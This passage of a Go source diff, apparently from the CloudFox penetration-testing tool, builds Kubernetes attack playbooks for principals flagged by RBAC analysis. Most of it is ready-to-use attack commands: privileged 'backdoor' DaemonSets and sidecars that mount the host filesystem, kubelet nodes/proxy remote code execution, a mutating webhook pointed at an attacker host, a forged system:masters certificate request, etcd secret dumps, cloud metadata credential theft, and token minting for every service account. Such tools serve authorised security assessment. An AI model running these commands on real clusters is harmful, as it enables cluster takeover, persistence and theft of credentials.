+		for _, path := range categories["Workload Creation"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create deployment with privileged service account\n")
+		sections.WriteString("kubectl create deployment backdoor --image=alpine -- sh -c 'sleep 3600'\n")
+		sections.WriteString("kubectl patch deployment backdoor -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccountName\":\"<target-sa>\"}}}}'\n\n")
+		sections.WriteString("# Create DaemonSet for node-wide persistence\n")
+		sections.WriteString("kubectl apply -f - <<'EOF'\n")
+		sections.WriteString("apiVersion: apps/v1\n")
+		sections.WriteString("kind: DaemonSet\n")
+		sections.WriteString("metadata:\n")
+		sections.WriteString("  name: node-backdoor\n")
+		sections.WriteString("spec:\n")
+		sections.WriteString("  selector:\n")
+		sections.WriteString("    matchLabels: {app: node-backdoor}\n")
+		sections.WriteString("  template:\n")
+		sections.WriteString("    metadata:\n")
+		sections.WriteString("      labels: {app: node-backdoor}\n")
+		sections.WriteString("    spec:\n")
+		sections.WriteString("      hostNetwork: true\n")
+		sections.WriteString("      hostPID: true\n")
+		sections.WriteString("      containers:\n")
+		sections.WriteString("      - name: backdoor\n")
+		sections.WriteString("        image: alpine\n")
+		sections.WriteString("        command: [\"sh\", \"-c\", \"sleep 3600\"]\n")
+		sections.WriteString("        securityContext: {privileged: true}\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Pod Modification
+	if len(categories["Pod Modification"]) > 0 {
+		sections.WriteString("## Pod Modification\n\n")
+		sections.WriteString("Principals with pod modification capabilities can inject containers or change security context.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Pod Modification"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Patch a pod to add a privileged container\n")
+		sections.WriteString("kubectl patch pod <pod-name> -n <namespace> --type=json -p='[\n")
+		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/containers/-\",\"value\":{\n")
+		sections.WriteString("    \"name\":\"pwn\",\n")
+		sections.WriteString("    \"image\":\"alpine\",\n")
+		sections.WriteString("    \"command\":[\"sh\",\"-c\",\"sleep 3600\"],\n")
+		sections.WriteString("    \"securityContext\":{\"privileged\":true}\n")
+		sections.WriteString("  }}\n")
+		sections.WriteString("]'\n\n")
+		sections.WriteString("# Update pod to change security context\n")
+		sections.WriteString("kubectl patch pod <pod-name> -n <namespace> --type=merge -p='{\n")
+		sections.WriteString("  \"spec\":{\"containers\":[{\"name\":\"<container>\",\"securityContext\":{\"privileged\":true}}]}\n")
+		sections.WriteString("}'\n\n")
+		sections.WriteString("# Note: Most pod fields are immutable after creation\n")
+		sections.WriteString("# Consider patching the parent deployment/daemonset instead\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Workload Modification
+	if len(categories["Workload Modification"]) > 0 {
+		sections.WriteString("## Workload Modification\n\n")
+		sections.WriteString("Principals with workload modification capabilities can inject backdoors into deployments/daemonsets.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Workload Modification"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Patch deployment to use a privileged service account\n")
+		sections.WriteString("kubectl patch deployment <name> -n <namespace> -p='{\n")
+		sections.WriteString("  \"spec\":{\"template\":{\"spec\":{\"serviceAccountName\":\"<privileged-sa>\"}}}\n")
+		sections.WriteString("}'\n\n")
+		sections.WriteString("# Inject a sidecar container into a deployment\n")
+		sections.WriteString("kubectl patch deployment <name> -n <namespace> --type=json -p='[\n")
+		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/template/spec/containers/-\",\"value\":{\n")
+		sections.WriteString("    \"name\":\"backdoor\",\n")
+		sections.WriteString("    \"image\":\"alpine\",\n")
+		sections.WriteString("    \"command\":[\"sh\",\"-c\",\"while true; do sleep 3600; done\"],\n")
+		sections.WriteString("    \"securityContext\":{\"privileged\":true},\n")
+		sections.WriteString("    \"volumeMounts\":[{\"name\":\"host\",\"mountPath\":\"/host\"}]\n")
+		sections.WriteString("  }},\n")
+		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/template/spec/volumes/-\",\"value\":{\n")
+		sections.WriteString("    \"name\":\"host\",\"hostPath\":{\"path\":\"/\"}\n")
+		sections.WriteString("  }}\n")
+		sections.WriteString("]'\n\n")
+		sections.WriteString("# Patch daemonset for node-wide persistence\n")
+		sections.WriteString("kubectl patch daemonset <name> -n <namespace> -p='{\n")
+		sections.WriteString("  \"spec\":{\"template\":{\"spec\":{\"hostNetwork\":true,\"hostPID\":true}}}\n")
+		sections.WriteString("}'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Token Creation
+	if len(categories["Token Creation"]) > 0 {
+		sections.WriteString("## Token Creation\n\n")
+		sections.WriteString("Principals with token creation capabilities can generate tokens for any service account.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Token Creation"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Generate token for a privileged service account\n")
+		sections.WriteString("kubectl create token <service-account-name> -n <namespace>\n\n")
+		sections.WriteString("# Use the token to authenticate\n")
+		sections.WriteString("TOKEN=$(kubectl create token <sa-name>)\n")
+		sections.WriteString("kubectl --token=$TOKEN get secrets -A\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Node Access
+	if len(categories["Node Access"]) > 0 {
+		sections.WriteString("## Node Access\n\n")
+		sections.WriteString("Principals with node access capabilities can access the kubelet API or register rogue nodes.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Node Access"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation - nodes/proxy RCE:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# This is a CRITICAL vulnerability - allows RCE on any pod via kubelet API\n")
+		sections.WriteString("# Reference: grahamhelton.com/blog/nodes-proxy-rce\n\n")
+		sections.WriteString("# 1. Get a token\n")
+		sections.WriteString("TOKEN=$(kubectl create token <sa-name>)\n\n")
+		sections.WriteString("# 2. Get node IPs\n")
+		sections.WriteString("kubectl get nodes -o wide\n\n")
+		sections.WriteString("# 3. List pods on node via kubelet\n")
+		sections.WriteString("curl -sk -H \"Authorization: Bearer $TOKEN\" https://<NODE_IP>:10250/pods\n\n")
+		sections.WriteString("# 4. Execute command on any pod\n")
+		sections.WriteString("websocat --insecure \\\n")
+		sections.WriteString("  --header \"Authorization: Bearer $TOKEN\" \\\n")
+		sections.WriteString("  --protocol v4.channel.k8s.io \\\n")
+		sections.WriteString("  \"wss://<NODE_IP>:10250/exec/<namespace>/<pod>/<container>?output=1&error=1&command=id\"\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Webhook
+	if len(categories["Webhook"]) > 0 {
+		sections.WriteString("## Webhook Manipulation\n\n")
+		sections.WriteString("Principals with webhook capabilities can intercept or modify API requests.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Webhook"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create mutating webhook to inject sidecars\n")
+		sections.WriteString("kubectl apply -f - <<'EOF'\n")
+		sections.WriteString("apiVersion: admissionregistration.k8s.io/v1\n")
+		sections.WriteString("kind: MutatingWebhookConfiguration\n")
+		sections.WriteString("metadata:\n")
+		sections.WriteString("  name: inject-webhook\n")
+		sections.WriteString("webhooks:\n")
+		sections.WriteString("- name: inject.attacker.com\n")
+		sections.WriteString("  clientConfig:\n")
+		sections.WriteString("    url: \"https://<attacker>/mutate\"\n")
+		sections.WriteString("  rules:\n")
+		sections.WriteString("  - apiGroups: [\"\"]\n")
+		sections.WriteString("    resources: [\"pods\"]\n")
+		sections.WriteString("    apiVersions: [\"v1\"]\n")
+		sections.WriteString("    operations: [\"CREATE\"]\n")
+		sections.WriteString("  admissionReviewVersions: [\"v1\"]\n")
+		sections.WriteString("  sideEffects: None\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Certificate
+	if len(categories["Certificate"]) > 0 {
+		sections.WriteString("## Certificate Signing\n\n")
+		sections.WriteString("Principals with CSR approval capabilities can generate valid client certificates.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Certificate"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# 1. Create a CSR for cluster-admin\n")
+		sections.WriteString("openssl req -new -key key.pem -out csr.pem -subj \"/CN=system:admin/O=system:masters\"\n\n")
+		sections.WriteString("# 2. Submit CSR to Kubernetes\n")
+		sections.WriteString("kubectl apply -f csr.yaml\n\n")
+		sections.WriteString("# 3. Approve the CSR\n")
+		sections.WriteString("kubectl certificate approve <csr-name>\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Storage
+	if len(categories["Storage"]) > 0 {
+		sections.WriteString("## Storage Access\n\n")
+		sections.WriteString("Principals with PV creation capabilities can mount host filesystems.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Storage"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create hostPath PV for node filesystem access\n")
+		sections.WriteString("kubectl apply -f - <<'EOF'\n")
+		sections.WriteString("apiVersion: v1\n")
+		sections.WriteString("kind: PersistentVolume\n")
+		sections.WriteString("metadata:\n")
+		sections.WriteString("  name: node-root\n")
+		sections.WriteString("spec:\n")
+		sections.WriteString("  capacity: {storage: 100Gi}\n")
+		sections.WriteString("  accessModes: [ReadWriteOnce]\n")
+		sections.WriteString("  hostPath:\n")
+		sections.WriteString("    path: /\n")
+		sections.WriteString("    type: Directory\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// CRD Management
+	if len(categories["CRD Management"]) > 0 {
+		sections.WriteString("## CRD Management\n\n")
+		sections.WriteString("Principals with CRD management capabilities can manipulate custom resources.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["CRD Management"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create CRD without validation for controller injection\n")
+		sections.WriteString("kubectl apply -f - <<'EOF'\n")
+		sections.WriteString("apiVersion: apiextensions.k8s.io/v1\n")
+		sections.WriteString("kind: CustomResourceDefinition\n")
+		sections.WriteString("metadata:\n")
+		sections.WriteString("  name: exploits.attacker.example.com\n")
+		sections.WriteString("spec:\n")
+		sections.WriteString("  group: attacker.example.com\n")
+		sections.WriteString("  names:\n")
+		sections.WriteString("    kind: Exploit\n")
+		sections.WriteString("    plural: exploits\n")
+		sections.WriteString("  scope: Namespaced\n")
+		sections.WriteString("  versions:\n")
+		sections.WriteString("  - name: v1\n")
+		sections.WriteString("    served: true\n")
+		sections.WriteString("    storage: true\n")
+		sections.WriteString("    schema:\n")
+		sections.WriteString("      openAPIV3Schema:\n")
+		sections.WriteString("        type: object\n")
+		sections.WriteString("        x-kubernetes-preserve-unknown-fields: true\n")
+		sections.WriteString("EOF\n")
+		sections.WriteString("```\n\n")
+	}
+
+	return sections.String()
+}
+
+// GenerateExfilPlaybook generates a comprehensive data exfiltration playbook from attack paths
+func GenerateExfilPlaybook(paths []AttackPath, identityHeader string) string {
+	if len(paths) == 0 {
+		return ""
+	}
+
+	var sections strings.Builder
+	if identityHeader != "" {
+		sections.WriteString(fmt.Sprintf(`# Kubernetes Data Exfiltration Playbook for %s
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified data exfiltration capabilities.
+
+`, identityHeader))
+	} else {
+		sections.WriteString(`# Kubernetes Data Exfiltration Playbook
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified data exfiltration capabilities.
+
+`)
+	}
+
+	// Group by category
+	categories := map[string][]AttackPath{
+		"Secrets":                    {},
+		"ConfigMaps":                 {},
+		"Logs":                       {},
+		"Data Extraction":            {},
+		"Storage":                    {},
+		"Custom Resources":           {},
+		"CRD Secrets (Certs)":        {},
+		"CRD Secrets (ExtSecrets)":   {},
+		"CRD Secrets (CSI)":          {},
+		"CRD Secrets (Vault)":        {},
+		"Token Exfil":                {},
+		"Etcd Access":                {},
+	}
+
+	for _, path := range paths {
+		if path.PathType != "exfil" {
+			continue
+		}
+		if _, ok := categories[path.Category]; ok {
+			categories[path.Category] = append(categories[path.Category], path)
+		}
+	}
+
+	// Secrets
+	if len(categories["Secrets"]) > 0 {
+		sections.WriteString("## Secret Exfiltration\n\n")
+		sections.WriteString("Principals with secret access can retrieve sensitive credentials, API keys, and certificates.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Secrets"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List all secrets\n")
+		sections.WriteString("kubectl get secrets -A\n\n")
+		sections.WriteString("# Decode secret data\n")
+		sections.WriteString("kubectl get secrets -o json | jq '.items[].data | map_values(@base64d)'\n\n")
+		sections.WriteString("# Get specific secret types\n")
+		sections.WriteString("kubectl get secrets -A -o json | jq '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .data.token | @base64d'\n\n")
+		sections.WriteString("# Find secrets containing specific keywords\n")
+		sections.WriteString("kubectl get secrets -A -o json | jq '.items[].data | map_values(@base64d)' | grep -iE 'password|token|key|secret|credential'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// ConfigMaps
+	if len(categories["ConfigMaps"]) > 0 {
+		sections.WriteString("## ConfigMap Exfiltration\n\n")
+		sections.WriteString("Principals with configmap access can read configuration that may contain sensitive data.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["ConfigMaps"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List all configmaps\n")
+		sections.WriteString("kubectl get configmaps -A\n\n")
+		sections.WriteString("# Get configmap data\n")
+		sections.WriteString("kubectl get configmaps -A -o yaml\n\n")
+		sections.WriteString("# Search for sensitive data\n")
+		sections.WriteString("kubectl get configmaps -A -o yaml | grep -iE 'password|token|key|secret|credential|connection'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Logs
+	if len(categories["Logs"]) > 0 {
+		sections.WriteString("## Log Exfiltration\n\n")
+		sections.WriteString("Principals with log access can read pod logs that may contain sensitive data.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Logs"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Get logs from a pod\n")
+		sections.WriteString("kubectl logs <pod-name> --all-containers --prefix\n\n")
+		sections.WriteString("# Search logs for credentials\n")
+		sections.WriteString("kubectl logs <pod-name> | grep -iE 'password|token|key|secret|error|exception'\n\n")
+		sections.WriteString("# Get logs from all pods in namespace\n")
+		sections.WriteString("for pod in $(kubectl get pods -o name); do kubectl logs $pod --all-containers 2>/dev/null; done\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Data Extraction (exec)
+	if len(categories["Data Extraction"]) > 0 {
+		sections.WriteString("## Data Extraction via Pod Exec\n\n")
+		sections.WriteString("Principals with exec access can extract data directly from containers.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Data Extraction"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Extract environment variables (often contain secrets)\n")
+		sections.WriteString("kubectl exec <pod-name> -- env\n\n")
+		sections.WriteString("# Read mounted secrets\n")
+		sections.WriteString("kubectl exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
+		sections.WriteString("# Extract files from container\n")
+		sections.WriteString("kubectl cp <pod-name>:/path/to/file ./exfil/\n\n")
+		sections.WriteString("# Access cloud provider metadata\n")
+		sections.WriteString("kubectl exec <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Storage
+	if len(categories["Storage"]) > 0 {
+		sections.WriteString("## Storage Exfiltration\n\n")
+		sections.WriteString("Principals with PVC access can read persistent volume data.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Storage"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List PVCs\n")
+		sections.WriteString("kubectl get pvc -A\n\n")
+		sections.WriteString("# Create a pod that mounts an existing PVC\n")
+		sections.WriteString("kubectl run exfil --image=alpine --restart=Never --overrides='{\n")
+		sections.WriteString("  \"spec\": {\n")
+		sections.WriteString("    \"containers\": [{\n")
+		sections.WriteString("      \"name\": \"exfil\",\n")
+		sections.WriteString("      \"image\": \"alpine\",\n")
+		sections.WriteString("      \"command\": [\"sleep\", \"3600\"],\n")
+		sections.WriteString("      \"volumeMounts\": [{\"name\": \"data\", \"mountPath\": \"/data\"}]\n")
+		sections.WriteString("    }],\n")
+		sections.WriteString("    \"volumes\": [{\"name\": \"data\", \"persistentVolumeClaim\": {\"claimName\": \"<pvc-name>\"}}]\n")
+		sections.WriteString("  }\n")
+		sections.WriteString("}'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Token Exfil
+	if len(categories["Token Exfil"]) > 0 {
+		sections.WriteString("## Token Exfiltration\n\n")
+		sections.WriteString("Principals with token creation capabilities can generate tokens for external use.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Token Exfil"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Generate tokens for all service accounts\n")
+		sections.WriteString("for sa in $(kubectl get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{\"\\n\"}{end}'); do\n")
+		sections.WriteString("  ns=$(echo $sa | cut -d/ -f1)\n")
+		sections.WriteString("  name=$(echo $sa | cut -d/ -f2)\n")
+		sections.WriteString("  echo \"=== $sa ===\"\n")
+		sections.WriteString("  kubectl create token $name -n $ns 2>/dev/null\n")
+		sections.WriteString("done\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Custom Resources (generic CRD data access)
+	if len(categories["Custom Resources"]) > 0 {
+		sections.WriteString("## Custom Resource Exfiltration\n\n")
+		sections.WriteString("Principals with wildcard CRD access can read custom resources that may contain sensitive data.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Custom Resources"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List all CRDs in the cluster\n")
+		sections.WriteString("kubectl get crds\n\n")
+		sections.WriteString("# List all API groups (including CRDs)\n")
+		sections.WriteString("kubectl api-resources --verbs=list -o name\n\n")
+		sections.WriteString("# Get all resources from each CRD group\n")
+		sections.WriteString("for group in $(kubectl api-resources -o name | grep '\\.'); do\n")
+		sections.WriteString("  echo \"=== $group ===\"\n")
+		sections.WriteString("  kubectl get $group -A -o yaml 2>/dev/null | head -100\n")
+		sections.WriteString("done\n\n")
+		sections.WriteString("# Search CRD resources for sensitive data\n")
+		sections.WriteString("kubectl get <crd-resource> -A -o json | jq '.items[] | select(.spec | tostring | test(\"password|secret|token|key|credential\"; \"i\"))'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Etcd Access
+	if len(categories["Etcd Access"]) > 0 {
+		sections.WriteString("## Etcd Access\n\n")
+		sections.WriteString("Principals with exec access to etcd pods can dump the entire cluster database.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Etcd Access"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Find etcd pods\n")
+		sections.WriteString("kubectl get pods -n kube-system -l component=etcd\n\n")
+		sections.WriteString("# Exec into etcd pod and dump secrets\n")
+		sections.WriteString("kubectl exec -it -n kube-system <etcd-pod> -- sh -c '\n")
+		sections.WriteString("  ETCDCTL_API=3 etcdctl \\\n")
+		sections.WriteString("    --endpoints=https://127.0.0.1:2379 \\\n")
+		sections.WriteString("    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n")
+		sections.WriteString("    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n")
+		sections.WriteString("    --key=/etc/kubernetes/pki/etcd/server.key \\\n")
+		sections.WriteString("    get /registry/secrets --prefix --keys-only\n")
+		sections.WriteString("'\n\n")
+		sections.WriteString("# Dump specific secret from etcd\n")
+		sections.WriteString("kubectl exec -it -n kube-system <etcd-pod> -- sh -c '\n")
+		sections.WriteString("  ETCDCTL_API=3 etcdctl \\\n")
+		sections.WriteString("    --endpoints=https://127.0.0.1:2379 \\\n")
+		sections.WriteString("    --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n")
+		sections.WriteString("    --cert=/etc/kubernetes/pki/etcd/server.crt \\\n")
+		sections.WriteString("    --key=/etc/kubernetes/pki/etcd/server.key \\\n")
+		sections.WriteString("    get /registry/secrets/<namespace>/<secret-name>\n")
+		sections.WriteString("'\n\n")
+		sections.WriteString("# WARNING: Etcd data is often stored unencrypted!\n")
+		sections.WriteString("# Secrets extracted from etcd may be in plaintext.\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// CRD-based secrets
+	for _, crdType := range []string{"CRD Secrets (Certs)", "CRD Secrets (ExtSecrets)", "CRD Secrets (CSI)", "CRD Secrets (Vault)"} {
+		if len(categories[crdType]) > 0 {
+			sections.WriteString(fmt.Sprintf("## %s\n\n", crdType))
+			sections.WriteString("Principals with access to secret-related CRDs can extract sensitive data.\n\n")
+			sections.WriteString("### Principals with this capability:\n")
+			for _, path := range categories[crdType] {
+				sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+			}
+			sections.WriteString("\n### Exploitation:\n")
+			sections.WriteString("```bash\n")
+			sections.WriteString("# List CRD resources\n")
+			sections.WriteString("kubectl api-resources --api-group=<group> -o name\n\n")
+			sections.WriteString("# Get all resources of the CRD type\n")
+			sections.WriteString("kubectl get <resource> -A -o yaml\n")
+			sections.WriteString("```\n\n")
+		}
+	}
+
+	return sections.String()
+}
+
+// GenerateLateralPlaybook generates a comprehensive lateral movement playbook from attack paths
+func GenerateLateralPlaybook(paths []AttackPath, identityHeader string) string {
+	if len(paths) == 0 {
+		return ""
+	}
+
+	var sections strings.Builder
+	if identityHeader != "" {
+		sections.WriteString(fmt.Sprintf(`# Kubernetes Lateral Movement Playbook for %s
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified lateral movement capabilities.
+
+`, identityHeader))
+	} else {
+		sections.WriteString(`# Kubernetes Lateral Movement Playbook
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified lateral movement capabilities.
+
+`)
+	}
+
+	// Group by category
+	categories := map[string][]AttackPath{
+		"Pod Access":            {},
+		"Token Theft":           {},
+		"Config Access":         {},
+		"Service Discovery":     {},
+		"Node Access":           {},
+		"Network":               {},
+		"Namespace Discovery":   {},
+		"Pod Discovery":         {},
+		"Ingress":               {},
+		"CRD Policy Bypass":     {},
+	}
+
+	for _, path := range paths {
+		if path.PathType != "lateral" {
+			continue
+		}
+		if _, ok := categories[path.Category]; ok {
+			categories[path.Category] = append(categories[path.Category], path)
+		}
+	}
+
+	// Pod Access
+	if len(categories["Pod Access"]) > 0 {
+		sections.WriteString("## Pod Access\n\n")
+		sections.WriteString("Principals with pod exec/attach capabilities can move laterally to other containers.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Pod Access"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List pods across namespaces\n")
+		sections.WriteString("kubectl get pods -A -o wide\n\n")
+		sections.WriteString("# Exec into pods to access their service accounts\n")
+		sections.WriteString("kubectl exec -it <pod-name> -n <namespace> -- /bin/sh\n\n")
+		sections.WriteString("# Port forward to internal services\n")
+		sections.WriteString("kubectl port-forward <pod-name> 8080:80\n\n")
+		sections.WriteString("# Attach to running containers\n")
+		sections.WriteString("kubectl attach -it <pod-name>\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Token Theft
+	if len(categories["Token Theft"]) > 0 {
+		sections.WriteString("## Token Theft\n\n")
+		sections.WriteString("Principals with secret access can steal SA tokens for lateral movement.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Token Theft"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List service account secrets\n")
+		sections.WriteString("kubectl get secrets -A -o json | jq '.items[] | select(.type==\"kubernetes.io/service-account-token\") | {name: .metadata.name, namespace: .metadata.namespace}'\n\n")
+		sections.WriteString("# Extract and decode token\n")
+		sections.WriteString("TOKEN=$(kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.token}' | base64 -d)\n\n")
+		sections.WriteString("# Use token to authenticate as that SA\n")
+		sections.WriteString("kubectl --token=$TOKEN get pods -A\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Config Access
+	if len(categories["Config Access"]) > 0 {
+		sections.WriteString("## Config Access\n\n")
+		sections.WriteString("Principals with configmap access can discover service configurations for lateral movement.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Config Access"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List configmaps across namespaces\n")
+		sections.WriteString("kubectl get configmaps -A\n\n")
+		sections.WriteString("# Find service URLs and connection strings\n")
+		sections.WriteString("kubectl get configmaps -A -o yaml | grep -iE 'host|url|endpoint|connection|database'\n\n")
+		sections.WriteString("# Extract specific configmap data\n")
+		sections.WriteString("kubectl get configmap <name> -n <namespace> -o yaml\n\n")
+		sections.WriteString("# Look for kubeconfig or other credentials in configmaps\n")
+		sections.WriteString("kubectl get configmaps -A -o json | jq '.items[] | select(.data | to_entries[] | .value | test(\"apiVersion|clusters|contexts\"; \"i\"))'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Service Discovery
+	if len(categories["Service Discovery"]) > 0 {
+		sections.WriteString("## Service Discovery\n\n")
+		sections.WriteString("Principals with service/endpoint access can discover internal services for lateral movement.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Service Discovery"] {
